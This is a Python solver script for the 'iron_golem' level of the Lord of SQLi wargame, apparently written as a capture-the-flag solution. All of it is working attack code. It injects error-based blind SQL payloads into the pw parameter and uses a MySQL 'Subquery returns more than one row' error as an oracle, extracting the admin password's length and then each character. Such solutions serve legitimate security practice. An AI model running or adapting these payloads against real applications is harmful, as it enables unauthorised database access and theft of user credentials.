import requests
from settings import session_id


# 기본 설정
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
cookies = {'PHPSESSID': session_id}


def find_pw_length():
    for i in range(6, 50):
        payload = f"?pw=%27or%20id='admin' and if(length(pw)={str(i)},(select 1 union select 2),1)%23"
        res = requests.get(url + payload, cookies=cookies)
        # 결과 메시지에 오류 문구가 포함되면 참
        if "Subquery" in res.text:
            return i
    return


def find_pw(length):
    pw = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            payload = f"?pw=%27or if(ord(substr(pw,{i},1))={j},(select 1 union select 2),1)%23"
            res = requests.get(url + payload, cookies=cookies)
            if 'Subquery' in (res.text):
                char = chr(j)
                pw += char
                print(char)
                break
    return pw


pw_length = find_pw_length()
print(f"Password length: {pw_length}")
pw = find_pw(pw_length)
print()
print(f"Password: {pw}")
